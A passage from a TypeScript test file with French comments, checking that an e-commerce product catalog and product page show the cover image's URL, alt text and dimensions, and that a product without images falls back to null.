    const card = catalog.view.items.find((item) => item.slug === "t-shirt-basique-blanc");
    expect(card).toBeDefined();
    expect(card!.image?.url).toBe(coverRow.url);
    expect(card!.image?.alt).toBe("Détail du col");
    // Les dimensions accompagnent l'URL : le navigateur réserve la place.
    expect(card!.image?.width).toBe(64);
    expect(card!.image?.height).toBe(48);

    // 2) La fiche produit lit `images[0]` après un tri par position — on
    //    reproduit exactement sa requête.
    const detail = await prismaTest.product.findUniqueOrThrow({
      where: { slug: "t-shirt-basique-blanc" },
      include: { images: { orderBy: { position: "asc" } } },
    });
    expect(detail.images[0]!.url).toBe(coverRow.url);
    expect(detail.images[0]!.alt).toBe("Détail du col");
  });

  it("un produit sans aucun visuel reste affichable (le repli de rendu prend le relais)", async () => {
    // AC : « si un produit n'a aucun visuel, le repli de rendu existant
    // (ProductVisual) prend le relais — aucune fiche produit ne casse ».
    const catalog = await loadCatalog({ query: "", categorySlug: null, sort: "recents", page: 1 });
    const card = catalog.view.items.find((item) => item.slug === "t-shirt-basique-blanc");
    expect(card).toBeDefined();
    expect(card!.image).toBeNull();
  });
});
